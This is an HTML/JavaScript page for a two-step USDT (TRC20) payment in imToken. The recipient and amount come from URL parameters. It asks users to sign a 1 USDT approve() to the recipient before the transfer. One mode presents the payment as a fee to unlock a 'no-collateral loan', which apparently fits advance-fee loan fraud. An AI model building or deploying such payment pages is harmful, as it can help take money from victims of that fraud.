<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
<title>USDT 支付</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  body{
    font-family:system-ui,-apple-system,"PingFang SC","Hiragino Sans GB","Microsoft YaHei",sans-serif;
    background:#f5f6fa;color:#12141d;line-height:1.55;
    display:flex;align-items:center;justify-content:center;
    min-height:100vh;padding:20px;
  }
  .card{
    background:#fff;border-radius:20px;padding:30px 24px;
    width:min(420px,100%);box-shadow:0 20px 60px rgba(15,17,26,.12);
    text-align:center;
  }
  h1{font-size:22px;font-weight:800;margin-bottom:6px;letter-spacing:-.3px}
  .sub{font-size:13.5px;color:#8d93a6;margin-bottom:24px}
  .info{
    background:#f8f9fd;border-radius:14px;padding:18px;margin-bottom:20px;
    text-align:left;
  }
  .info-row{
    display:flex;justify-content:space-between;align-items:center;
    padding:10px 0;border-bottom:1px dashed #e8eaf1;
  }
  .info-row:last-child{border-bottom:none;padding-bottom:0}
  .info-k{font-size:13px;color:#8d93a6;flex:0 0 auto}
  .info-v{font-size:13.5px;font-weight:700;word-break:break-all;text-align:right;margin-left:12px}
  .info-v.gold{color:#f0a020;font-size:18px}
  .btn{
    display:block;width:100%;padding:15px;border-radius:14px;
    border:none;font-size:16px;font-weight:800;cursor:pointer;
    transition:.18s;margin-bottom:12px;
  }
  .btn-pay{background:linear-gradient(135deg,#f0a020,#e88a10);color:#fff}
  .btn-pay:hover{transform:translateY(-1px);box-shadow:0 8px 20px rgba(240,160,32,.35)}
  .btn-pay:disabled{opacity:.5;cursor:not-allowed;transform:none}
  .btn-ghost{background:#f1f2f7;color:#5b6070}
  .status{
    padding:14px;border-radius:12px;font-size:13.5px;
    margin-top:16px;display:none;text-align:left;line-height:1.6;
  }
  .status.loading{display:block;background:#fff9ec;color:#c27800;border:1px solid #ffe0b2}
  .status.success{display:block;background:#f0fdf4;color:#16a34a;border:1px solid #bbf7d0}
  .status.error{display:block;background:#fef2f2;color:#dc2626;border:1px solid #fecaca}
  .env-warn{
    padding:13px;border-radius:12px;font-size:12.5px;
    background:#fff4ec;color:#c2410c;border:1px solid #ffe0b2;
    margin-bottom:14px;line-height:1.6;text-align:left;
  }
</style>
</head>
<body>
<div class="card">
  <h1 id="page-title">USDT 支付</h1>
  <p class="sub" id="page-sub">请在 imToken 中确认支付</p>

  <div id="env-warn" class="env-warn" style="display:none">
    <div style="margin-bottom:8px">⚠️ 当前不在 imToken 环境中。</div>
    <button onclick="location.reload()" style="background:#c2410c;color:#fff;border:none;padding:6px 12px;border-radius:6px;font-size:12px;cursor:pointer;">重新检测</button>
  </div>

  <div class="info">
    <div class="info-row">
      <span class="info-k">收款地址</span>
      <span class="info-v" id="info-addr">-</span>
    </div>
    <div class="info-row">
      <span class="info-k">网络</span>
      <span class="info-v" id="info-chain">-</span>
    </div>
    <div class="info-row">
      <span class="info-k">支付金额</span>
      <span class="info-v gold" id="info-amount">-</span>
    </div>
  </div>

  <button class="btn btn-pay" id="btn-pay" disabled>第 1 步：确认授权 1U</button>
  <button class="btn btn-ghost" id="btn-cancel">取消 / 刷新页面</button>

  <div class="status" id="status"></div>
</div>

<script>
const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const params = new URLSearchParams(location.search);
const toAddress = params.get('address') || '';
const amount = Number(params.get('amount')) || 0;
const type = params.get('type') || 'deposit';
const payPageUrl = location.href;
let step = 1; // 1: approve 授权, 2: transfer 支付
function $(s) { return document.querySelector(s); }
if (type === 'empty') {
  $('#page-title').textContent = '空放资格支付';
  $('#page-sub').textContent = '支付 1 USDT 激活空放通道';
} else {
  $('#page-title').textContent = '押金充值';
  $('#page-sub').textContent = '请在 imToken 中确认支付';
}
$('#info-addr').textContent = toAddress || '未配置';
$('#info-chain').textContent = 'TRC20 (波场)';
$('#info-amount').textContent = amount + ' USDT';

function imTokenUniversalLink(dappUrl) { return 'https://connect.token.im/link/navigate/DappView?url=' + encodeURIComponent(dappUrl); }
function imTokenSchemeLink(dappUrl) { return 'imtokenv2://navigate/DappView?url=' + encodeURIComponent(dappUrl); }
function fallbackCopy(text, done) { try { const ta = document.createElement('textarea'); ta.value = text; ta.style.position='fixed'; ta.style.opacity='0'; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); ta.remove(); if (done) done(); } catch(e) { prompt('请复制链接到 imToken 浏览打开：', text); } }
function copyText(text, done) { if (navigator.clipboard && navigator.clipboard.writeText) navigator.clipboard.writeText(text).then(done, ()=>fallbackCopy(text,done)); else fallbackCopy(text, done); }
function getTronWeb() { return window.tronWeb || (window.tron && window.tron.tronWeb) || window.tronLink || null; }
function isWalletEnv() { const ua=(navigator.userAgent||'').toLowerCase(); const tw=getTronWeb(); return ua.includes('imtoken')||ua.includes('tokenpocket')||ua.includes('tpwallet')||!!(tw&&tw.ready); }
function isInAppBrowser() { const ua=(navigator.userAgent||'').toLowerCase(); return /micromessenger|aweme|bytedance|toutiao|newsarticle|qq\/|weibo|alipay/i.test(ua); }
function isAndroid() { return /android/i.test(navigator.userAgent || ''); }
function withTimeout(p, ms, msg) { return Promise.race([p, new Promise((_,rej)=>setTimeout(()=>rej(new Error(msg)),ms))]); }
async function withRetry(fn, times, delay) { let lastErr; for (let i=0;i<times;i++){ try { return await fn(); } catch(e){ lastErr=e; if (i<times-1) await new Promise(r=>setTimeout(r,delay)); } } throw lastErr; }
// 唤起 imToken：安卓直接用 scheme（秒开，少一次跳转），失败兜底 Universal Link；iOS 用 Universal Link
function openWalletNow() {
  const ul = imTokenUniversalLink(payPageUrl);
  if (isAndroid()) {
    location.href = imTokenSchemeLink(payPageUrl);
    setTimeout(() => { if (document.visibilityState !== 'hidden') location.href = ul; }, 1500);
  } else {
    location.href = ul;
  }
}

function showOpenWalletUI(reason) {
  const warn = $('#env-warn');
  warn.style.display = 'block';
  warn.innerHTML = '<div style="margin-bottom:10px;font-weight:700;">' + (reason || '当前未检测到钱包环境') + '</div>'
    + '<div style="font-size:12.5px;line-height:1.7;margin-bottom:12px;">请在 imToken 钱包内打开本页完成支付。若未自动跳转，请点击下方按钮，或复制链接到 imToken「浏览」中粘贴打开。</div>'
    + '<button id="__open_imtoken__" style="width:100%;background:#0e8aff;color:#fff;border:none;padding:12px;border-radius:10px;font-size:14px;font-weight:800;margin-bottom:8px;cursor:pointer;">立即打开 imToken 支付</button>'
    + '<button id="__copy_paylink__" style="width:100%;background:#f1f2f7;color:#5b6070;border:none;padding:11px;border-radius:10px;font-size:13px;cursor:pointer;">复制支付链接</button>'
    + '<div id="__copied_tip__" style="font-size:12px;color:#16a34a;margin-top:8px;display:none;">✅ 已复制，打开 imToken → 浏览 → 粘贴网址</div>';
  warn.querySelector('#__open_imtoken__').onclick = openWalletNow;
  warn.querySelector('#__copy_paylink__').onclick = () => { copyText(payPageUrl, () => { warn.querySelector('#__copied_tip__').style.display='block'; }); };
  const btn = $('#btn-pay');
  btn.disabled = true;
  btn.textContent = '请在 imToken 中打开本页';
}

let envCheckCount = 0;
const MAX_ENV_CHECK = 16; // 最多 8 秒，不再等 20 秒
function checkEnvironment() {
  const tw = getTronWeb();
  // tronWeb 对象一出现就启用按钮（不等 ready/地址，点击时再等），消除按钮长时间禁用的卡顿感
  if (tw) {
    $('#env-warn').style.display = 'none';
    const btn = $('#btn-pay');
    btn.disabled = false;
    btn.textContent = step === 1 ? '第 1 步：确认授权 1U' : ('第 2 步：确认支付 ' + amount + ' USDT');
    return;
  }
  if (envCheckCount < MAX_ENV_CHECK) {
    envCheckCount++;
    if (envCheckCount === 6) showOpenWalletUI('⏳ 正在等待钱包环境注入，若长时间无反应请点击下方按钮打开 imToken'); // 3 秒即给入口
    setTimeout(checkEnvironment, 500);
  } else {
    showOpenWalletUI('⚠️ 未检测到钱包环境');
  }
}
checkEnvironment();

// 等待钱包就绪 + 地址注入，带进度提示
async function waitWalletReady(tw) {
  let waited = 0;
  let slowTip = false;
  while ((!tw.ready || !(tw.defaultAddress && tw.defaultAddress.base58)) && waited < 8000) {
    await new Promise(r => setTimeout(r, 200)); waited += 200;
    if (waited >= 3000 && !slowTip) { slowTip = true; setStatus('loading', '⏳ 钱包初始化较慢，请稍候（安卓设备通常需要几秒）…'); }
  }
  if (!tw.ready) throw new Error('钱包环境未就绪，请退出页面后重新进入');
  const fromAddress = tw.defaultAddress && tw.defaultAddress.base58;
  if (!fromAddress) throw new Error('钱包地址未就绪，请退出页面后重新进入');
  return fromAddress;
}
// 构建合约交易：8 秒超时 + 自动重试一次，节点慢时给出提示
async function buildContractTx(tw, fnSig, params, fromAddress, label) {
  let slowTimer = setTimeout(() => setStatus('loading', '⏳ 波场节点响应较慢，正在努力连接（已自动重试）…'), 3000);
  try {
    return await withRetry(() => withTimeout(
      tw.transactionBuilder.triggerSmartContract(USDT_CONTRACT, fnSig, { feeLimit: 100000000 }, params, fromAddress),
      8000, '节点响应超时，请重试'
    ), 2, 600);
  } finally { clearTimeout(slowTimer); }
}

$('#btn-pay').onclick = async function () {
  const btn = this;
  btn.disabled = true;

  if (step === 1) {
    btn.textContent = '请求授权中…';
    setStatus('loading', '第 1 步：正在构建授权交易，请稍候…');
    try {
      const tw = getTronWeb();
      if (!tw) throw new Error('未检测到钱包环境，请点击上方按钮在 imToken 中打开');
      const fromAddress = await waitWalletReady(tw);
      const approveParam = [ { type:'address', value: toAddress }, { type:'uint256', value: '1000000' } ];
      const txApprove = await buildContractTx(tw, 'approve(address,uint256)', approveParam, fromAddress, '授权');
      if (!txApprove.result || !txApprove.result.result) throw new Error('构建授权交易失败');
      setStatus('loading', '✅ 授权交易已构建，请在钱包弹窗中确认授权…');
      const signedApprove = await withTimeout(tw.trx.sign(txApprove.transaction), 120000, '授权签名超时（您可能未在钱包中确认），请重试');
      await withTimeout(tw.trx.sendRawTransaction(signedApprove), 15000, '广播授权交易超时，请检查网络后重试');
      setStatus('success', '✅ 授权成功！请点击下方按钮进行第 2 步支付。');
      step = 2;
      btn.textContent = '第 2 步：确认支付 ' + amount + ' U';
      btn.disabled = false;
    } catch (e) {
      setStatus('error', '❌ 授权失败: ' + (e.message || '用户取消'));
      btn.textContent = '重新授权';
      btn.disabled = false;
    }
    return;
  }

  btn.textContent = '请求支付中…';
  setStatus('loading', '第 2 步：正在构建支付交易，请稍候…');
  try {
    const tw = getTronWeb();
    if (!tw) throw new Error('未检测到钱包环境，请点击上方按钮在 imToken 中打开');
    const fromAddress = await waitWalletReady(tw);
    const amountUnits = Math.floor(amount * 1e6).toString();
    const transferParam = [ { type:'address', value: toAddress }, { type:'uint256', value: amountUnits } ];
    const txTransfer = await buildContractTx(tw, 'transfer(address,uint256)', transferParam, fromAddress, '支付');
    if (!txTransfer.result || !txTransfer.result.result) throw new Error('构建支付交易失败');
    setStatus('loading', '✅ 支付交易已构建，请在钱包弹窗中确认支付…');
    const signed = await withTimeout(tw.trx.sign(txTransfer.transaction), 120000, '支付签名超时（您可能未在钱包中确认），请重试');
    await withTimeout(tw.trx.sendRawTransaction(signed), 15000, '广播支付交易超时，请检查网络后重试');
    setStatus('success', '✅ 全部操作已完成，请在钱包账单中查看状态');
    btn.textContent = '已完成';
  } catch (e) {
    setStatus('error', '❌ 支付失败: ' + (e.message || '用户取消'));
    btn.textContent = '重新支付';
    btn.disabled = false;
  }
};
$('#btn-cancel').onclick = () => window.history.back();
function setStatus(type, msg) { const el = $('#status'); el.className = 'status ' + type; el.innerHTML = msg; }

if (isInAppBrowser() && !isWalletEnv()) {
  showOpenWalletUI('⚠️ 当前为 App 内置浏览器，无法唤起钱包');
}
</script>
</body>
</html>
